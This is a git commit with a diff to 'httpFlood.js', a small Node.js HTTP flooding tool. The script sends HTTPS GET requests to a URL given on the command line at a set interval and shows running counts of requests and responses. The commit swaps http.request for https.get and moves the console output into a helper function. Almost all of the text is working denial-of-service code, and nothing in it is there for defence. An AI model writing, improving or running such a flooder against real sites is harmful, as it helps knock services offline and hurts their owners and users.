45615fd4c1a87b32269f6611cf5b0a069c5c17ee
Marko Puzovic <markopuzovic98@gmail.com>
2020-12-06 18:35:11 +0100

    changed get method and output text method

--- httpFlood.js
+++ httpFlood.js
@@ -1,25 +1,15 @@
-let http=require("http");
-let targetHost=process.argv[2].split('/')[2];
-let targetPath=process.argv[2].split(targetHost)[1];
+let https=require("https");
+let url=process.argv[2];
 let frequency=process.argv[3];
 let requestsSent=0;
 let responsesReceived=0;
-  var options = {
-    host:targetHost,
-    path:targetPath
-  };
-  
-  callback = function(response) {
-    response.on('data', function (chunk) {
-    });
-  
-    response.on('end', function () {
-      responsesReceived++;
-    });
-  }
-  setInterval(()=>{
-    http.request(options, callback).end();
-    requestsSent++;
-    console.clear();
-    console.log(`Requests : ${requestsSent}\nResponses : ${responsesReceived}\nULR : ${process.argv[2]}`);
-  },frequency);
+setInterval(()=>{
+  https.get(process.argv[2], (response)=>refreshTerminalOutput(requestsSent,++responsesReceived,url));
+  refreshTerminalOutput(++requestsSent,responsesReceived,url);
+},frequency);
+
+function refreshTerminalOutput(rs,rr,url)
+{
+  console.clear();
+  console.log(`Requests : ${rs}\nResponses : ${rr}\nULR : ${url}`);
+}
